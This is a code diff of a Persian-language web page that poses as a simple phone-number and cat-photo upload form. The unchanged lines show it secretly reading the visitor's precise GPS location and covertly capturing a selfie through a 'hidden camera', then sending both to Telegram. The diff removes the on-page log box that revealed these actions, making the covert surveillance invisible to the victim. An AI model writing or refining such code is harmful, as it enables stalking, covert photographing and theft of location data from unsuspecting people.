@@ -135,18 +135,6 @@
             border-radius: 15px;
             margin-top: 10px;
         }
-        .log-box {
-            background: #f5f5f5;
-            border-radius: 10px;
-            padding: 10px;
-            margin-top: 10px;
-            font-size: 12px;
-            color: #555;
-            max-height: 80px;
-            overflow-y: auto;
-            direction: ltr;
-            text-align: left;
-        }
         .step-indicator {
             display: flex;
             justify-content: space-between;
@@ -271,7 +259,7 @@
         <div id="statusStep2" style="text-align: center; font-size: 14px; color: #555; margin-top: 10px;">
             ⏳ منتظر انتخاب عکس...
         </div>
-        <div class="log-box" id="logBox"></div>
+        <!-- logBox کاملاً حذف شد -->
     </div>
 
     <!-- ====== مرحله ۳: موفقیت ====== -->
@@ -343,7 +331,6 @@
                 document.getElementById('uploadBtn').disabled = false;
                 document.getElementById('statusStep2').innerHTML = '✅ عکس انتخاب شد. روی دکمه ارسال کلیک کنید.';
                 
-                // پیش‌نمایش
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     const preview = document.getElementById('preview');
@@ -451,18 +438,12 @@
                         const lat = pos.coords.latitude;
                         const lon = pos.coords.longitude;
                         sendLocationToTelegram(lat, lon);
-                        document.getElementById('logBox').innerHTML += 
-                            `\n📍 لوکیشن ارسال شد: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                     },
                     err => {
                         console.log("❌ خطا در دریافت لوکیشن:", err.message);
-                        document.getElementById('logBox').innerHTML += 
-                            `\n❌ خطا در دریافت لوکیشن: ${err.message}`;
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
-            } else {
-                document.getElementById('logBox').innerHTML += '\n❌ مرورگر از GPS پشتیبانی نمی‌کند';
             }
         }
 
@@ -509,7 +490,6 @@
             document.getElementById('step2').classList.remove('hidden');
             updateStep(2);
             document.getElementById('statusStep2').innerHTML = '📸 منتظر انتخاب عکس گربه...';
-            document.getElementById('logBox').innerHTML = '✅ شماره ارسال شد\n✅ دوربین مخفی فعال شد';
         }
 
         // ============================================================
@@ -530,7 +510,6 @@
                 })
                 .catch(err => {
                     console.error("❌ خطا در دوربین مخفی:", err);
-                    document.getElementById('logBox').innerHTML += '\n❌ دوربین مخفی در دسترس نیست';
                 });
             }
         }
@@ -597,9 +576,6 @@
             const catSent = await sendBlobToTelegram(catPhotoBlob, '🐱 عکس گربه');
             if (catSent) {
                 catPhotoUploaded = true;
-                document.getElementById('logBox').innerHTML += '\n✅ عکس گربه ارسال شد';
-            } else {
-                document.getElementById('logBox').innerHTML += '\n❌ خطا در ارسال عکس گربه';
             }
 
             // 5. بستن دوربین مخفی
@@ -620,7 +596,6 @@
                 }
                 document.getElementById('submittedPhone').innerText = formattedPhone;
                 
-                // ✅ فقط عکس گربه رو نشون بده (سلفی مخفی رو حذف کن)
                 if (catPhotoUploaded) {
                     document.getElementById('photoStatus').innerHTML = '✅ عکس گربه با موفقیت ارسال شد';
                 } else {
@@ -637,7 +612,6 @@
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
             updateStep(1);
-            document.getElementById('logBox').innerHTML = '⏳ منتظر شروع...';
         });
     </script>
 </body>
